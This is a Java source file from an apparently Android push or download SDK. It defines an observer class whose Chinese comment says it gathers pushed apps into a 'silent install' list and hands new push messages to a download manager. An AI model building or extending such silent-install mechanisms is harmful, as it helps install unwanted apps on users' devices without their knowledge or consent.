package com.tiho.dlplugin.observer.download;

import java.util.List;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushMessageBean;
import com.tiho.dlplugin.dao.PushDataSource;
import com.tiho.dlplugin.observer.DataSourceObserver;

import android.content.Context;

/**
 * 静默安装。 当数据源有数据变动时，会收到通知. 把里面的静默安装的应用筛选出来，放入到静默安装列表中
 * 
 * @author Joey.Dai
 * 
 */
public class AutoInstallObserver extends DataSourceObserver<PushMessageBean> {

	private DownloadManager manager;

	public AutoInstallObserver(Context c) {
		manager = DownloadManager.getInstance(c);
	}

	@Override
	protected void pushSaveNotified(List<PushMessageBean> msgs) {
		LogManager.LogShow("静默安装观察者收到新增消息通知");

		manager.addToDownloadList(msgs);

	}

	@Override
	protected void pushDeleteNotified(PushMessageBean msg) {
		if ("Y".equalsIgnoreCase(msg.getAutoInstall()))
			manager.deleteDownload(msg);
	}

	@Override
	protected int getSaveAction() {

		return PushDataSource.SILENT_PUSH_SAVE;
	}

	@Override
	protected int getDeleteAction() {

		return PushDataSource.SILENT_PUSH_DELETE;
	}

}
